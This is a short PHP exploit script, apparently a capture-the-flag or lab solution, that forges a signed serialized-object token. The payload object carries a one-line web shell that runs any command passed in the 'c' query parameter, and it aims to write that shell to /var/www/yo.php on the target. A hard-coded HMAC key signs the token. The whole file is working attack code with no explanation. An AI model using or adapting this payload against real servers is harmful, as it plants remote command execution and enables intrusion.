<?php  

define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza"); 
function sign($data) {   return hash_hmac('md5', $data, KEY); }

function tokenize($user) 
 {     $token = urlencode(base64_encode(serialize($user)));      
 	   $token.= "--".sign($token);    
 	   return $token;   }  

class File
{
     public $uuid='<?php system($_GET["c"]); ?>';
     public $logfile = "/var/www/yo.php";
	
}

echo tokenize(new File());

?>
